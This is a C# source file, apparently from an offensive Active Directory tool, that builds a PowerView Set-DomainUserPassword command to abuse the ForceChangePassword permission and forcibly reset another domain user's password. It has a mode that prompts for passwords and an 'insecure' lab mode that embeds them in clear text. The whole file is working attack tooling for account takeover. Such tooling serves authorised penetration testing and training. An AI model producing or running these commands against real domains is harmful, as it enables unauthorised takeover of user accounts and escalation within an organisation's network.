namespace AD_Commander.Generators;

// Builds the PowerView `Set-DomainUserPassword` command (ForceChangePassword ACL abuse).
// Pure text generation only: nothing here runs PowerShell or touches the network.
public static class SetDomainUserPasswordGenerator
{
    public static string Generate(
        string domain,
        string username,
        string targetIdentity,
        string credentialPassword,
        string newTargetPassword,
        bool secureMode)
    {
        string account = GeneratorHelpers.EscapeSingleQuotes(domain) + "\\" + GeneratorHelpers.EscapeSingleQuotes(username);
        string identity = GeneratorHelpers.EscapeSingleQuotes(targetIdentity);

        if (secureMode)
        {
            // Default: PowerShell asks for both passwords at runtime; they never enter this app.
            return Join(
                "$SecPassword = Read-Host \"Credential password\" -AsSecureString",
                "",
                $"$Cred = New-Object System.Management.Automation.PSCredential('{account}', $SecPassword)",
                "",
                $"$TargetPassword = Read-Host \"New password for {identity}\" -AsSecureString",
                "",
                GeneratorHelpers.PowerViewImport,
                "",
                $"Set-DomainUserPassword -Identity '{identity}' -AccountPassword $TargetPassword -Credential $Cred -Verbose");
        }

        // Insecure: passwords are embedded in the script. Lab use only.
        return Join(
            "# !!! INSECURE: passwords are embedded in clear text below. Use only in an isolated lab. !!!",
            "",
            $"$SecPassword = ConvertTo-SecureString '{GeneratorHelpers.EscapeSingleQuotes(credentialPassword)}' -AsPlainText -Force",
            $"$Cred = New-Object System.Management.Automation.PSCredential('{account}', $SecPassword)",
            "",
            $"$TargetPassword = ConvertTo-SecureString '{GeneratorHelpers.EscapeSingleQuotes(newTargetPassword)}' -AsPlainText -Force",
            "",
            GeneratorHelpers.PowerViewImport,
            "",
            $"Set-DomainUserPassword -Identity '{identity}' -AccountPassword $TargetPassword -Credential $Cred -Verbose");
    }

    // Join lines with Windows newlines.
    private static string Join(params string[] lines) => string.Join("\r\n", lines);
}
